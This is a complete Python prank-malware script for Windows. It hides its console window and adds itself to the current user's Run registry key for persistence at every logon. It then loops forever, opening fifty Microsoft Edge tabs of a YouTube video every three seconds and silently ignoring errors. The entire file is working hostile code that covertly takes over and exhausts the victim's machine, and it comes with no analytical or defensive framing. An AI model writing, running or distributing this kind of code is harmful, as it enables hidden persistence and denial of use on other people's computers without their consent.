import subprocess
import time
import os
import ctypes
import sys
import winreg as reg

# Hide the console window
ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

# URL and browser path
URL = "https://www.youtube.com/watch?v=iik25wqIuFo"
BROWSER = r"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"

# Function to add the script to Windows startup
def add_to_startup():
    script_path = sys.argv[0]  # Path to the current script
    key = r"Software\Microsoft\Windows\CurrentVersion\Run"
    with reg.OpenKey(reg.HKEY_CURRENT_USER, key, 0, reg.KEY_WRITE) as registry_key:
        reg.SetValueEx(registry_key, "MyTrollScript", 0, reg.REG_SZ, script_path)

# Check if the script is already in the startup (to avoid duplication)
def is_in_startup():
    script_path = sys.argv[0]  # Path to the current script
    key = r"Software\Microsoft\Windows\CurrentVersion\Run"
    try:
        with reg.OpenKey(reg.HKEY_CURRENT_USER, key) as registry_key:
            value, _ = reg.QueryValueEx(registry_key, "MyTrollScript")
            if value == script_path:
                return True
    except FileNotFoundError:
        pass
    return False

# Add the script to startup if it's not already there
if not is_in_startup():
    add_to_startup()

# Infinite loop to open the URL repeatedly in the browser
while True:
    try:
        for _ in range(50):  # Open 50 tabs
            subprocess.Popen([BROWSER, URL], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(3)
    except:
        pass
